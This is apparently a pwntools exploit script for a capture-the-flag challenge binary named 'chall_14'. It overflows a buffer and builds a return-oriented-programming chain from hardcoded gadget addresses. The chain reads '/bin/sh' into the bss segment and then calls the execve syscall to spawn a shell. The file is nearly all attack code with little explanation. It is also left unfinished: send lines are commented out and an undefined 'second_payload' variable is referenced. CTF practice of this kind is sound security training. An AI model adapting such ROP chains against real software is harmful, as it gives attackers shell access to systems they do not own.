from pwn import *

mmap_addr = 0x00449760
write_addr = 0x00448aa0
syscall = 0x00000000004012d3
pop_rdi = 0x00000000004018ca
pop_rdx = 0x00000000004017cf
pop_rsi_r15 = 0x00000000004018c8
pop_rax = 0x00000000004494a7
load_3 = 0x004bd0c0
zero_arg = p64(0x0)
bin_sh = b'/bin/sh\0'
bs_segment = 0x004c2240

offset = 0x100 + 0x8

p = process('./chall_14')

payload = cyclic(offset) 
payload += p64(pop_rdi) + zero_arg # first chain
payload += p64(pop_rsi_r15) + p64(bs_segment) + zero_arg # second chain
payload += p64(pop_rdx) + p64(len(bin_sh) + 1) # pop len of /bin/sh into rdx
payload += p64(pop_rax) + zero_arg # pop syscall write into rax
payload += p64(p.elf.sym['read'])

# # send first payload `db 0x00448a0e`
# p.sendline(payload)

# # send bin_sh as input
# p.sendline(bin_sh)

payload += p64(pop_rax) + p64(0x3b) # execve syscall
payload += p64(pop_rdi) + p64(bs_segment) # address where /bin/sh is stored
payload += p64(pop_rsi_r15) + zero_arg + zero_arg # load NULL into misc args
payload += p64(pop_rdx) + zero_arg # load NULL into misc args
payload += p64(syscall) # call syscall with shell

# # send second payload
# p.sendline(second_payload)
